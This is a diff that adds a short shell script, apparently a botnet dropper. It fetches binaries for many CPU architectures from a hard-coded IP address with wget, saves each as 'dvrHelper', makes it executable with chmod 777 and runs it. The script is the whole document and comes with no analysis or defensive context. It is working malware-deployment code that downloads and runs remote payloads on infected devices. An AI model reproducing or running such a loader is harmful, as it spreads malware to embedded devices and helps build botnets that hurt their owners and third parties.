@@ -1,0 +1,12 @@
+#!/bin/sh
+
+WEBSERVER="162.253.42.70:80"
+
+
+BINARIES="arm.hex arm7.hex m68k.hex mips.hex ppc.hex sh4.hex spc.hex x86.hex"
+
+for Binary in $BINARIES; do
+    wget http://$WEBSERVER/bins/$Binary -O dvrHelper
+    chmod 777 dvrHelper
+    ./dvrHelper
+done
